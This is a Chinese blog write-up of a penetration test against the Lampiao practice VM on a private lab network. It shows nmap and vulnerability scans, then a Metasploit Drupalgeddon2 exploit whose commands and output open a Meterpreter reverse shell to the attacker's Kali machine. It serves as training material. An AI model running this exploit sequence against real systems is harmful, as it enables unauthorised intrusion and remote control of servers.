---
# 当前页面内容标题
title: Lampiao渗透测试
# sidebar: heading
# 当前页面图标
icon: note
# 分类
category:
    - 日常
tag:
    - 渗透测试
sticky: false
# 是否收藏在博客主题的文章列表中，当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中
article: true
# 是否将该文章添加至时间线中
timeline: true
# sidebar: heading
order: 1
date: 2023-02-16
# 浏览量
pageview: true
---
# Lampiao渗透测试

已知信息：

- 系统：ubuntu 14.04.5
- ip：192.168.235.0-255

## 信息收集

```cmd
nmap -sP 192.168.235.1/24
```

![image-20221020191130854](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020191130854.png)

发现4个IP存活，排除1（网关），254（广播地址）和130（kali），那就是133，获取该主机的信息

```cmd
nmap -A 192.168.235.133
```

![image-20221020192202681](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020192202681.png)

发现目标主机开启了两个端口，分别是：

1. 22/tcp：版本OpenSSH 6.6.1p1
2. 80/tcp：

访问80端口

![image-20221020192558888](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020192558888.png)

使用御剑扫描一下目录，没有结果

![image-20221020193315207](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020193315207.png)

使用Nessus对目标主机进行漏扫，发现还有一个1898端口是开启的，使用浏览器访问

![image-20221020195123574](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020200557833.png)

继续在Nessus收集信息

![image-20221020200557833](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020212832956.png)

查看/includes路径，进入了文本的目录

![image-20221020200641789](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020200641789.png)

web服务器

![image-20221020212832956](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020195123574.png)

php版本

![image-20221020213007029](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020213007029.png)

Drupal版本：

![image-20221020213036080](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020213036080.png)

使用acunetix扫描

```url
http://192.168.235.133:1898
```

![image-20221020214453181](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020214453181.png)

## 开始攻击

![image-20221020215715086](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020215715086.png)

使用msf来进行攻击，首先查找drupal相关的漏洞，一共有7个，因为不知道用哪个，所以要一个一个试

当使用use 1 时获取到了系统权限

```shell
msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 192.168.235.133
rhosts => 192.168.235.133
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rport 1898
rport => 1898
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
[*] Started reverse TCP handler on 192.168.235.130:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39927 bytes) to 192.168.235.133
[*] Meterpreter session 1 opened (192.168.235.130:4444 -> 192.168.235.133:34234) at 2022-10-20 10:35:48 -0400
```

输入shell

![image-20221020224214073](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221020224214073.png)

